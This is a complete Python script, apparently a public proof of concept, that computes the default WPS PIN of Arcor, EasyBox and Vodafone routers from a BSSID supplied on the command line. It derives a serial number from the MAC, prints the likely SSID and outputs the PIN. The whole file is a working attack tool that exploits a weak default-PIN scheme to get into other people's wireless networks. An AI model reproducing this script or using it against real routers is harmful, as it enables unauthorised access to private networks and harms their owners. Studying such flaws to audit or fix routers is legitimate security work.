#!/usr/bin/env python
import sys, re

def gen_pin(mac_str, sn):
    mac_int = [int(mac_str[i:i+2], 16) for i in range(0, len(mac_str), 2)]
    sn_int = [0] * 5 + [int(x) for x in sn[5:]]
    hpin = [0] * 7
    
    k1 = (sn_int[6] + sn_int[7] + mac_int[10] + mac_int[11]) & 0xF
    k2 = (sn_int[8] + sn_int[9] + mac_int[8] + mac_int[9]) & 0xF
    hpin[0] = k1 ^ sn_int[9]
    hpin[1] = k1 ^ sn_int[8]
    hpin[2] = k2 ^ mac_int[9]
    hpin[3] = k2 ^ mac_int[10]
    hpin[4] = mac_int[10] ^ sn_int[9]
    hpin[5] = mac_int[11] ^ sn_int[8]
    hpin[6] = k1 ^ sn_int[7]
    pin = int('%1X%1X%1X%1X%1X%1X%1X' % tuple(hpin), 16) % 10000000

    accum = 0
    t = pin
    while t:
        accum += 3 * (t % 10)
        t //= 10
        accum += t % 10
        t //= 10
    return '%i%i' % (pin, (10 - accum % 10) % 10)

def main():
    if len(sys.argv) != 2:
        sys.exit('usage: easybox_wps.py [BSSID]\n eg. easybox_wps.py 38:22:9D:11:22:33\n')
        
    mac_str = re.sub(r'[^a-fA-F0-9]', '', sys.argv[1])
    if len(mac_str) != 12:
        sys.exit('check MAC format!\n')
        
    sn = 'R----%05i' % int(mac_str[8:12], 16)
    print('derived serial number:', sn)
    print('SSID: Arcor|EasyBox|Vodafone-%c%c%c%c%c%c' % tuple(mac_str[6:12]))
    print('WPS pin:', gen_pin(mac_str, sn))

if __name__ == "__main__":
    main()
